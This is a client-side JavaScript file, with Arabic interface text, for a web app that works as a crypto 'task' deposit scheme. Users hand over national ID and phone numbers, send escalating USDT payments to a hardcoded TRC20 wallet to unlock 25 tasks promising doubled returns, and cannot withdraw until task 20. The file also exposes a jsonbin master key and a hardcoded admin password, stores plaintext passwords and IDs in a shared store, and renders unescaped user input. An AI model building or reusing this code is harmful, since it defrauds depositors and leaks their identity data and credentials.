// ==== إعداد Bin.io ====
const BIN_ID = "6924db89d0ea881f40fde913"; // ضع Bin ID هنا
const MASTER_KEY = "$2a$10$k7UNDXuzwGDFt8SlvSm02.DfIHhcwx5A/IurS6k0..aiZ8aLYkVz2";

async function fetchBin() {
  try {
    const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
      headers: { "X-Master-Key": MASTER_KEY }
    });
    const data = await res.json();
    return data.record || { users: [] };
  } catch (err) {
    console.error("خطأ في جلب البيانات من Bin.io", err);
    return { users: [] };
  }
}

async function saveBin(record) {
  try {
    await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
      method: "PUT",
      headers: {
        "Content-Type": "application/json",
        "X-Master-Key": MASTER_KEY
      },
      body: JSON.stringify(record)
    });
  } catch (err) {
    console.error("خطأ في حفظ البيانات على Bin.io", err);
  }
}

// ==== بيانات المستخدمين ====
let currentUser = null;
let allUsers = [];

// ==== تحميل البيانات من Bin.io + إنشاء حساب أدمن دائم ====
async function loadData() {
  const binData = await fetchBin();
  allUsers = binData.users || [];

  // إنشاء حساب الأدمن إذا لم يوجد
  let adminUser = allUsers.find(u => u.email === "admin25@example.com");
  if (!adminUser) {
    adminUser = {
      name: "Admin",
      email: "admin25@example.com",
      pass: "25802580",
      balance: 0,
      tasksCompleted: 25,
      taskDeposits: Array(25).fill(0),
      depositRequests: [],
      withdrawRequests: []
    };
    allUsers.push(adminUser);
    await saveBin({ users: allUsers });
  }

  // محاولة تسجيل الدخول تلقائياً من localStorage
  const storedEmail = localStorage.getItem("currentUserEmail");
  if (storedEmail) {
    currentUser = allUsers.find(u => u.email === storedEmail) || null;
  }

  currentUser ? homePage() : loginPage();
}

// ==== تحديث Bin.io ====
async function updateUser() {
  if (!currentUser) return;
  const idx = allUsers.findIndex(u => u.email === currentUser.email);
  if (idx !== -1) allUsers[idx] = currentUser;
  else allUsers.push(currentUser);
  await saveBin({ users: allUsers });
  localStorage.setItem("currentUserEmail", currentUser.email);
  updateHeaderBalance();
}

// ==== عرض الرصيد في الهيدر ====
function updateHeaderBalance() {
  if (currentUser) document.getElementById("balanceDisplay").innerText = currentUser.balance;
}

// ==== عرض الهيدر ====
function showHeader(show) {
  document.getElementById("header").style.display = show ? "flex" : "none";
}

// ==== تسجيل الدخول / إنشاء حساب ====
function loginPage() {
  showHeader(false);
  document.getElementById("app").innerHTML = `
  <div class="container"><div class="box">
    <h2 style="text-align:center;">تسجيل الدخول</h2>
    <input id="loginEmail" type="email" placeholder="البريد الإلكتروني">
    <input id="loginPass" type="password" placeholder="كلمة المرور">
    <button onclick="login()">تسجيل الدخول</button>
    <button onclick="registerPage()" style="background:#444;color:white;">إنشاء حساب</button>
  </div></div>`;
}

function registerPage() {
  showHeader(false);
  document.getElementById("app").innerHTML = `
  <div class="container"><div class="box">
    <h2 style="text-align:center;">إنشاء حساب جديد</h2>
    <input id="regName" placeholder="الاسم الكامل">
    <input id="regEmail" type="email" placeholder="البريد الإلكتروني">
    <input id="regNID" placeholder="الرقم الوطني">
    <input id="regPhone" placeholder="رقم الهاتف">
    <select id="regCountry">
      <option value="+963">🇸🇾 سوريا +963</option>
      <option value="+20">🇪🇬 مصر +20</option>
      <option value="+971">🇦🇪 الإمارات +971</option>
      <option value="+90">🇹🇷 تركيا +90</option>
    </select>
    <input id="regPass" type="password" placeholder="كلمة المرور">
    <button onclick="register()">تسجيل</button>
    <button onclick="loginPage()" style="background:#444;color:white;">رجوع</button>
  </div></div>`;
}

function register() {
  let name = document.getElementById("regName").value;
  let email = document.getElementById("regEmail").value;
  let nid = document.getElementById("regNID").value;
  let phone = document.getElementById("regPhone").value;
  let country = document.getElementById("regCountry").value;
  let pass = document.getElementById("regPass").value;

  if (!name || !email || !nid || !phone || !pass) {
    alert("يرجى ملء جميع الحقول"); return;
  }

  currentUser = {
    name, email, nid, phone, country, pass,
    balance: 0,
    tasksCompleted: 0,
    taskDeposits: Array(25).fill(0),
    depositRequests: [],
    withdrawRequests: [],
    loggedIn: true
  };
  allUsers.push(currentUser);
  updateUser();
  homePage();
}

async function login() {
  let email = document.getElementById("loginEmail").value;
  let pass = document.getElementById("loginPass").value;
  let found = allUsers.find(u => u.email === email && u.pass === pass);
  if (!found) { alert("بيانات غير صحيحة"); return; }
  currentUser = found;
  currentUser.loggedIn = true;
  await updateUser();
  homePage();
}

// ==== الصفحة الرئيسية + المهام ====
function homePage() {
  showHeader(true);
  updateHeaderBalance();

  let tasksHtml = "";
  const maxLimit = 10000;

  for (let i = 0; i < 25; i++) {
    let dep, rew;
    if (i < 15) {
      dep = 10 * Math.pow(2, i);
      rew = 20 * Math.pow(2, i);
    } else {
      dep = Math.floor(500 + Math.random() * (maxLimit - 500));
      rew = Math.floor(1000 + Math.random() * (maxLimit - 1000));
    }
    if (!currentUser.taskDeposits[i]) currentUser.taskDeposits[i] = 0;
    let locked = currentUser.taskDeposits[i] < dep || currentUser.tasksCompleted < i;
    let completed = currentUser.tasksCompleted > i;

    tasksHtml += `
      <div class="task ${locked ? 'locked' : ''}">
        <i class="fa-solid fa-rocket"></i>
        <div class="task-content">
          <h3>المهمة رقم ${i + 1}</h3>
          <p>الإيداع المطلوب: <b>${dep}$</b></p>
          <p>الربح عند الإنجاز: <b>${rew}$</b></p>
          <p>الحالة: <b>${completed ? 'تم الإنجاز' : locked ? 'مقفلة' : 'جاهزة'}</b></p>
          <button onclick="openTask(${i},${dep},${rew})" ${locked || completed ? 'disabled' : ''}>تنفيذ المهمة</button>
        </div>
      </div>`;
  }

  document.getElementById("app").innerHTML = `
  <div class="container">
    <h2>مرحبا ${currentUser.name} | رصيدك: ${currentUser.balance}$</h2>
    ${tasksHtml}
  </div>`;
}

// ==== فتح المهمة ====
function openTask(index, dep, rew) {
  document.getElementById("app").innerHTML = `
  <div class="container">
    <div class="box">
      <h2>المهمة رقم ${index + 1}</h2>
      <p>المطلوب قبل التنفيذ: إيداع ${dep}$</p>
      <p>ربحك بعد الإنجاز: ${rew}$</p>
      <button onclick="checkDeposit(${index},${dep},${rew})">تنفيذ المهمة</button>
      <button class="back-btn" onclick="homePage()">رجوع</button>
    </div>
  </div>`;
}

function checkDeposit(index, dep, rew) {
  if (currentUser.taskDeposits[index] < dep) {
    alert(`❌ لا يمكن تنفيذ المهمة بدون إيداع ${dep}$`);
    return;
  }
  currentUser.balance += rew;
  currentUser.tasksCompleted = Math.max(currentUser.tasksCompleted, index + 1);
  updateUser();
  alert("✅ تم تنفيذ المهمة وتم إضافة الأرباح!");
  homePage();
}

// ==== الايداع ====
function depositPage() {
  document.getElementById("app").innerHTML = `
  <div class="container">
    <div class="box">
      <h2>إيداع الأموال</h2>
      <p>لإضافة رصيد، يرجى تحويل المبلغ إلى المحفظة التالية:</p>
      <p style="font-weight:bold;">USDT TRC20: <span style="color:#ff416c;">TQi3mspeUBS1Y4NknPu4zZVFiFG2JU5MkX</span></p>
      <input id="depositAmount" type="number" placeholder="المبلغ الذي حولته">
      <input id="depositImage" type="file" accept="image/*">
      <button onclick="submitDeposit()">تقديم طلب الإيداع</button>
      <button class="back-btn" onclick="homePage()">رجوع</button>
    </div>
  </div>`;
}

function submitDeposit() {
  let amount = parseFloat(document.getElementById("depositAmount").value);
  let image = document.getElementById("depositImage").files[0];
  if (!amount || !image) { alert("يرجى إدخال المبلغ ورفع الصورة"); return; }
  let reader = new FileReader();
  reader.onload = function () {
    currentUser.depositRequests.push({ amount, image: reader.result, date: new Date().toLocaleString() });
    updateUser();
    alert("✅ تم إرسال طلب الإيداع");
    homePage();
  }
  reader.readAsDataURL(image);
}

// ==== السحب ====
function withdrawPage() {
  if (currentUser.tasksCompleted < 20) { alert("❌ لا يمكن السحب قبل المهمة 20"); return; }
  document.getElementById("app").innerHTML = `
  <div class="container">
    <div class="box">
      <h2>سحب الأموال</h2>
      <p>رصيدك: ${currentUser.balance}$</p>
      <input id="withdrawWallet" placeholder="أدخل محفظتك">
      <button onclick="submitWithdraw()">طلب سحب</button>
      <button class="back-btn" onclick="homePage()">رجوع</button>
    </div>
  </div>`;
}

function submitWithdraw() {
  let w = document.getElementById("withdrawWallet").value;
  if (!w) { alert("يرجى إدخال المحفظة"); return; }
  currentUser.withdrawRequests.push({ wallet: w, amount: currentUser.balance, date: new Date().toLocaleString() });
  currentUser.balance = 0;
  updateUser();
  alert("✅ تم إرسال طلب السحب");
  homePage();
}

// ==== صفحة الحساب مع تعديل البيانات ====
function accountPage() {
  document.getElementById("app").innerHTML = `
  <div class="container">
    <div class="box">
      <h2>معلومات الحساب</h2>
      ${renderEditableField("الاسم", "name", currentUser.name)}
      ${renderEditableField("البريد الإلكتروني", "email", currentUser.email)}
      ${renderEditableField("الهاتف", "phone", currentUser.phone)}
      ${renderEditableField("الدولة", "country", currentUser.country)}
      ${renderEditableField("الرقم الوطني", "nid", currentUser.nid)}
      <p><b>الرصيد الحالي:</b> ${currentUser.balance}$</p>
      <p><b>عدد المهام المنجزة:</b> ${currentUser.tasksCompleted}</p>
      <button class="back-btn" onclick="homePage()">رجوع</button>
    </div>
  </div>`;
}

function renderEditableField(label, key, value) {
  return `<p><b>${label}:</b> <span id="field-${key}">${value}</span>
    <i class="fa-solid fa-pen" style="cursor:pointer;" onclick="editField('${key}')"></i></p>`;
}

function editField(key) {
  const span = document.getElementById(`field-${key}`);
  const oldValue = span.innerText;
  span.innerHTML = `<input id="input-${key}" value="${oldValue}"> <button onclick="saveField('${key}')">✅</button>`;
}

async function saveField(key) {
  const input = document.getElementById(`input-${key}`);
  currentUser[key] = input.value;
  await updateUser();
  accountPage();
}

// ==== لوحة الإدارة ====
async function adminLogin() {
  if (currentUser.email !== "admin25@example.com") {
    alert("❌ ليس لديك صلاحية الإدارة"); 
    return; 
  }

  showHeader(false);

  let requestsHtml = "";
  allUsers.forEach(u => {
    u.depositRequests.forEach((r, i) => {
      requestsHtml += `
        <div class="admin-request">
          <p><b>المستخدم:</b> ${u.name} | ${u.email}</p>
          <p><b>المبلغ:</b> ${r.amount}$ | التاريخ: ${r.date}</p>
          <img src="${r.image}" alt="صورة الإيداع" style="max-width:200px;">
          <div style="display:flex;gap:10px;">
            <button onclick="approveDeposit('${u.email}',${i})">✅ قبول</button>
            <button style="background:red;color:white;" onclick="rejectDeposit('${u.email}',${i})">❌ رفض</button>
          </div>
        </div>`;
    });
  });

  document.getElementById("app").innerHTML = `
    <div class="container">
      <div class="admin-box">
        <h2>طلبات الإيداع</h2>
        ${requestsHtml || "<p>لا توجد طلبات حالية</p>"}
        <button class="back-btn" onclick="homePage()">رجوع</button>
      </div>
    </div>`;
}

async function approveDeposit(email, index) {
  let user = allUsers.find(u => u.email === email);
  if (!user) return;

  let req = user.depositRequests[index];
  let nextTask = user.tasksCompleted;
  user.taskDeposits[nextTask] += req.amount;
  user.depositRequests.splice(index, 1);
  await saveBin({ users: allUsers });
  adminLogin();
}

async function rejectDeposit(email, index) {
  let user = allUsers.find(u => u.email === email);
  if (!user) return;

  user.depositRequests.splice(index, 1);
  await saveBin({ users: allUsers });
  adminLogin();
}

// ==== تسجيل الخروج ====
async function logout() {
  if (currentUser) {
    currentUser.loggedIn = false;
    localStorage.removeItem("currentUserEmail");
    await updateUser();
  }
  currentUser = null;
  showHeader(false);
  loginPage();
}

// ==== بدء التطبيق ====
loadData();
